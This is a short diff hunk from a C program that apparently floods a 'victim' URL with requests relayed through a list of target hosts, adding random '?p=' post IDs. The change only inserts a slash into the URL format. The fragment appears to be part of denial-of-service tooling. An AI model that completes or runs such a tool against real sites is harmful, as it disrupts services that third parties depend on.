@@ -86,7 +86,7 @@ int main(int argc, char *argv[]){
   while(ccnt < req){
     while(cnt < cnt_targets){
       rand_post = rand()%9999 + 1;
-      sprintf(random_number, "?p=%d", rand_post);
+      sprintf(random_number, "/?p=%d", rand_post);
       strcpy(victim, argv[3]);
       strcat(victim, random_number);
       char *split_target_uri = strdup(arr_targets[cnt]);
